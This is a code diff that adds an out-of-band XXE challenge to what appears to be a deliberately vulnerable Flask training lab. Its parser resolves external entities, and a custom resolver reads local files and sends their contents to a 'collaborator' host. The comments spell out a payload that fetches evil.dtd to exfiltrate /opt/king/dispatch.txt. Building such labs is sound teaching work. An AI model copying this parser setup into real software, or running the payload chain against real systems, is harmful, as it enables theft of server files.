@@ -25,7 +25,9 @@ from __future__ import annotations
 
 import os
 
-from flask import Blueprint, jsonify, render_template, request
+import requests
+
+from flask import Blueprint, Response, jsonify, render_template, request
 from lxml import etree
 from sqlalchemy import Column, Integer, String, create_engine, text
 from sqlalchemy.exc import SQLAlchemyError
@@ -33,6 +35,8 @@ from sqlalchemy.orm import declarative_base, sessionmaker
 
 from core import xml_parser
 from core.db import mysql_conn
+
+COLLABORATOR_BASE = "http://collaborator"
 
 bp = Blueprint("phase5", __name__)
 phase5_bp = bp
@@ -465,3 +469,162 @@ def p5_roster():
         members=members,
         error=error,
     )
+
+
+# ---------------------------------------------------------------------------
+# p5_5, The Silent Courier
+# ---------------------------------------------------------------------------
+#
+# p5_3 (The King's Sealed Archives) was *reflected* XXE: the route echoed
+# an element's resolved text back in its own HTTP response, so the attacker
+# could read the file contents directly from the response body. This floor
+# closes that in-band channel entirely: the route parses the caller's XML
+# with a custom resolver, but its own response is always a fixed, generic
+# "dispatch confirmed" message regardless of what the parsed document
+# contained. No element text, no entity resolution result, nothing
+# data-dependent ever reaches the HTTP response.
+#
+# The _OOBResolver class below is the attack surface: it enables both steps
+# of the exfil chain:
+#   1. HTTP entity resolution — the parser can fetch external DTDs from
+#      the collaborator service.  An attacker payload that declares
+#      %remote; = SYSTEM "http://collaborator/evil.dtd?f=/opt/king/dispatch.txt"
+#      and then expands %remote; causes the parser to fetch that DTD.
+#   2. File exfil — when the external DTD's %file; entity (SYSTEM
+#      "file:///opt/king/dispatch.txt") is expanded, the resolver reads the
+#      file and immediately fires GET http://collaborator/exfil?d=<contents>
+#      before returning the content to the parser.  The route's own response
+#      never carries that content.
+#
+# The lxml/libxml2 2.14.x resolver intercept is the realistic Python
+# implementation of "the XML parser makes a network call during entity
+# resolution."  Native libxml2 HTTP entity fetching requires an older
+# libxml2 build; in modern lxml the application registers a custom
+# etree.Resolver to mediate outbound fetches, which is what real Python
+# applications with XXE vulnerabilities actually do.
+#
+# From the challenger's perspective the experience is identical to any
+# OOB XXE: send XML with an external entity, get a blind response, check
+# an out-of-band channel for the exfiltrated data.
+
+
+class _OOBResolver(etree.Resolver):
+    """Custom resolver for p5_5 OOB XXE.
+
+    Handles two URL schemes that lxml does not resolve by default:
+
+    http:// — fetches the external DTD or entity from the network, enabling
+    the external-DTD step of the attack.  An attacker controls the
+    collaborator's /evil.dtd?f=<path> endpoint to point the read at any
+    file the app process can open.
+
+    file:// — reads the local file the external DTD declared, and exfils its
+    content to collaborator's /exfil?d=<data> BEFORE returning the content to
+    the parser.  The parser's own return path (the route's HTTP response) is
+    completely blind; the only evidence is the capture log entry.
+    """
+
+    def resolve(self, url, id, context):
+        if url.startswith(("http://", "https://")):
+            try:
+                resp = requests.get(url, timeout=5)
+                return self.resolve_string(resp.content, context, base_url=url)
+            except Exception:
+                return None
+
+        if url.startswith("file://"):
+            path = url[len("file://"):]
+            try:
+                with open(path, "rb") as fh:
+                    raw = fh.read()
+                data = raw.decode("utf-8", errors="replace")
+                # OOB exfil: file content leaves via a collaborator request,
+                # never via this route's own HTTP response.
+                try:
+                    requests.get(
+                        f"{COLLABORATOR_BASE}/exfil",
+                        params={"d": data},
+                        timeout=3,
+                    )
+                except Exception:
+                    pass
+                return self.resolve_string(raw, context)
+            except (OSError, IOError):
+                pass
+
+        return None
+
+
+@bp.route("/p5/courier", methods=["GET", "POST"])
+def p5_courier():
+    dispatched = False
+    error = None
+    raw_xml = None
+
+    if request.method == "POST":
+        if request.is_json:
+            payload = request.get_json(silent=True) or {}
+            raw_xml = payload.get("xml", "")
+        else:
+            raw_xml = request.form.get("xml", "")
+
+        try:
+            # VULN: p5_5 uses its own parser (not the shared xml_parser.parse())
+            # so it can register _OOBResolver, which implements the HTTP entity
+            # fetch and the file→collaborator exfil chain.  The same unsafe
+            # parser flags as the shared parser; the attack surface is the
+            # resolver intercept, not the flags alone.
+            # Critically, this route never echoes any element text: the
+            # only observable result of a successful parse is "dispatched".
+            oob_parser = etree.XMLParser(
+                resolve_entities=True,
+                load_dtd=True,
+                no_network=False,
+                huge_tree=False,
+            )
+            oob_parser.resolvers.add(_OOBResolver())
+            etree.fromstring(raw_xml.encode("utf-8"), oob_parser)
+            dispatched = True
+        except etree.XMLSyntaxError as exc:
+            error = f"the courier desk rejected that dispatch: {exc}"
+        except etree.Error:
+            error = "the courier desk rejected that dispatch"
+
+    wants_json = request.method == "POST" and (
+        request.is_json or request.headers.get("Accept") == "application/json"
+    )
+
+    if wants_json:
+        return jsonify(dispatched=dispatched, error=error)
+
+    return render_template(
+        "p5_courier.html",
+        attempted=request.method == "POST",
+        dispatched=dispatched,
+        raw_xml=raw_xml,
+        error=error,
+    )
+
+
+@bp.route("/p5/courier/captures", methods=["GET"])
+def p5_courier_captures():
+    """Server-side proxy for collaborator's GET /captures.
+
+    collaborator is reachable from Flask by its compose service name but
+    not from a student's browser directly. This route fetches the capture
+    feed server-side and hands the JSON straight back so the portal can
+    poll a same-origin URL instead, same pattern as p3_spellcard_captures.
+    """
+    try:
+        resp = requests.get(f"{COLLABORATOR_BASE}/captures", timeout=3)
+        return Response(
+            resp.content,
+            status=resp.status_code,
+            mimetype="application/json",
+        )
+    except Exception as exc:
+        return Response(
+            f'{{"error": {str(exc)!r}}}',
+            status=502,
+            mimetype="application/json",
+        )
